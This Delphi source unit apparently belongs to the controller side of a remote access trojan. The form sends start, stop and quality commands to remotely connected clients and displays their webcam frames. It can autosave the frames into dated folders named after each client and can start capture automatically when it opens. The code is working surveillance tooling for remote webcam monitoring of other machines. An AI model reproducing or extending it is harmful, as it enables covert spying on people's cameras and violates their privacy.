unit UnitWebcam;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, Spin, ComCtrls, UnitConnection, IniFiles,
  IdTCPServer, jpeg, UnitMain;

type
  TFormWebcam = class(TForm)
    stat1: TStatusBar;
    pnl1: TPanel;
    btn1: TButton;
    trckbr1: TTrackBar;
    se1: TSpinEdit;
    chk1: TCheckBox;
    img1: TImage;
    procedure trckbr1Change(Sender: TObject);
    procedure se1Change(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
    LastInterval, LastQuality: Integer;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormWebcam: TFormWebcam;

implementation

uses
  UnitConstants, UnitFunctions, UnitRepository, UnitStringCompression;

{$R *.dfm}
      
constructor TFormWebcam.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormWebcam.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormWebcam.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  MainCommand: string;
  Stream: TMemoryStream;
  Jpg: TJPEGImage;
  Bmp: TBitmap;
  TmpStr: string;
begin
  MainCommand := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
  Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

  if MainCommand = WEBCAMDISCONNECT then
  begin
    btn1.Caption := 'Start';
    stat1.Panels.Items[0].Text := 'Frame size: 0.0 Kb';
  end
  else

  if MainCommand = WEBCAMIMAGE then
  begin      
    if Length(ReceivedDatas) = 0 then Exit;
    
    if btn1.Enabled = False then
    begin
      btn1.Caption := 'Stop';
      btn1.Enabled := True;
    end;

    stat1.Panels.Items[0].Text := 'Frame size: ' + FileSizeToStr(Length(ReceivedDatas));

    Stream := TMemoryStream.Create;
    StrToStream(ReceivedDatas, Stream);
    Stream.Position := 0;

    Jpg := TJPEGImage.Create;
    try
      Jpg.LoadFromStream(Stream);
      Stream.Free;
      Bmp := TBitmap.Create;
      Bmp.Assign(jpg);
      Jpg.Free;
    except
      Jpg.Free;
      Bmp.Free;
      Stream.Free;
    end;

    if Chk1.Checked then
    begin
      TmpStr := GetWebCamFolder(Client.Identification);
      TmpStr := TmpStr + '\' + MyGetDate('-');
      if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
      TmpStr := TmpStr + '\' + MyGetTime('') + '.bmp';
      Bmp.SaveToFile(TmpStr);
    end;

    img1.Picture.Bitmap.Assign(Bmp);
    Bmp.Free;

    if (LastInterval <> se1.Value) or (LastQuality <> trckbr1.Position) then
    begin
      LastQuality := trckbr1.Position;
      LastInterval := se1.Value;

      SendDatas(Client.AThread, WEBCAMSETTINGS + '|' +
                IntToStr(LastQuality) + '|' + IntToStr(LastInterval));
    end;
  end;
end;

procedure TFormWebcam.trckbr1Change(Sender: TObject);
begin
  stat1.Panels.Items[1].Text := 'Image quality: ' + IntToStr(trckbr1.Position) + '%';
end;

procedure TFormWebcam.se1Change(Sender: TObject);
begin
  stat1.Panels.Items[2].Text := 'Interval refresh: ' + se1.Text + 's';
end;

procedure TFormWebcam.btn1Click(Sender: TObject);
begin
  if btn1.Caption = 'Start' then
  begin
    btn1.Enabled := False;
    LastInterval := se1.Value;
    LastQuality := trckbr1.Position;
    SendDatas(Client.AThread, WEBCAMCONNECT + '|' +
              IntToStr(trckbr1.Position) + '|' + se1.Text);
  end
  else SendDatas(Client.AThread, WEBCAMDISCONNECT + '|');
end;

procedure TFormWebcam.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  if btn1.Caption = 'Stop' then btn1.Click;

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Webcam', 'Left', Left);
  IniFile.WriteInteger('Webcam', 'Top', Top);
  IniFile.WriteInteger('Webcam', 'Width', Width);
  IniFile.WriteInteger('Webcam', 'Height', Height);  
  IniFile.WriteInteger('Webcam', 'Image quality', trckbr1.Position);
  IniFile.WriteString('Webcam', 'Refresh interval', se1.Text);
  IniFile.WriteBool('Webcam', 'Autosave', chk1.Checked);
  IniFile.Free;
end;

procedure TFormWebcam.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Webcam', 'Left', 521);
  Top := IniFile.ReadInteger('Webcam', 'Top', 161);
  Width := IniFile.ReadInteger('Webcam', 'Width', 371);
  Height := IniFile.ReadInteger('Webcam', 'Height', 274);
  trckbr1.Position := IniFile.ReadInteger('Webcam', 'Image quality', 50);
  se1.Text := IniFile.ReadString('Webcam', 'Refresh interval', '1');
  chk1.Checked := IniFile.ReadBool('Webcam', 'Autosave', False);
  IniFile.Free;
end;

procedure TFormWebcam.FormShow(Sender: TObject);
begin
  if AutostartCam then btn1.Click;
end;

end.
